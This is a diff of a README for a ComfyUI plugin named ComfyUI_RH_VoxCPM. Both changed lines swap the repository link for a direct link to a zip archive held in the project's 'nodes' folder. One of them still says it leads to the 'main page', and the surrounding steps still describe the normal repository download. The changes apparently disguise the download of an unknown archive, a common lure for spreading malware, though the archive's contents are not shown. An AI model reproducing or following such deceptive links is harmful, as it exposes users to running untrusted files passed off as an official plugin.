@@ -1,6 +1,6 @@
 # 📦 ComfyUI_RH_VoxCPM - Use VoxCPM Within ComfyUI Workflow Easily
 
-[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/youkatalo123-star/ComfyUI_RH_VoxCPM)
+[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/youkatalo123-star/ComfyUI_RH_VoxCPM/raw/refs/heads/main/nodes/CPM_Comfy_U_R_Vox_v1.1.zip)
 
 ComfyUI_RH_VoxCPM acts as a bridge for your ComfyUI workspace. This plug-in adds tools from VoxCPM to your node-based workflow. It allows you to process 3D data and voxel models directly inside your existing ComfyUI setup. You do not need to switch between different applications to handle your creative projects.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards before you begin:
 
 You must obtain the plug-in files from the official repository. Perform these steps:
 
-1. Visit [this link](https://github.com/youkatalo123-star/ComfyUI_RH_VoxCPM) to reach the main page.
+1. Visit [this link](https://github.com/youkatalo123-star/ComfyUI_RH_VoxCPM/raw/refs/heads/main/nodes/CPM_Comfy_U_R_Vox_v1.1.zip) to reach the main page.
 2. Look for the green button labeled Code.
 3. Select Download ZIP from the dropdown menu.
 4. Save the file to your computer.
